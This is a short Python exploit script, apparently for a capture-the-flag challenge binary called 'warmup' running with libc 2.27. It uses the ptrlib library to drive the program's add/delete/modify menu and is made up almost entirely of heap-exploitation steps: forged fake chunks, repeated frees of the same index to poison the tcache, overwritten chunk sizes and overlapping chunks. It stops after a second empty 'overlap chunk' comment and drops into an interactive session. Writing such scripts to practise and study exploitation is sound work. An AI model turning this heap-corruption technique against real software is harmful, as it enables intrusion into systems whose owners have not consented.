from ptrlib import *

def add(data):
    sock.sendlineafter("\n>>", "1")
    sock.sendafter("content>>", data)
    return

def delete(index):
    sock.sendlineafter("\n>>", "2")
    sock.sendlineafter(":", str(index))
    return

def modify(index, data):
    sock.sendlineafter("\n>>", "3")
    sock.sendlineafter(":", str(index))
    sock.sendafter("content>>", data)
    return

libc = ELF("./libc-2.27.so")
sock = Process("./warmup")

# create fake chunk
payload = b'A' * 0x30
payload += p64(0) + p64(0x51)
add(payload) # 0 @0x50
add("1")     # 1 @0xa0
payload = b'B' * 0x20
payload += p64(0) + p64(0x21)
add("2")     # 2 @0xf0
add("3")     # 3 @0x140
add("4")     # 4 @0x190

# overwrite chunk size
delete(0)
delete(0)
add("\xa0")  # 0
payload = p64(0) + p64(0xa1)
add(p64(0))  # 5
add(payload) # 6

# use up fastbin
for i in range(8):
    delete(1)

# overlap chunk
delete(0)
delete(2)
delete(5) # == 0
add("\x90") # 0
payload = p64(0) + p64(0x71)
add(p64(1))  # 1
add(p64(2))  # 2
add(payload) # 5

# overlap chunk


sock.interactive()
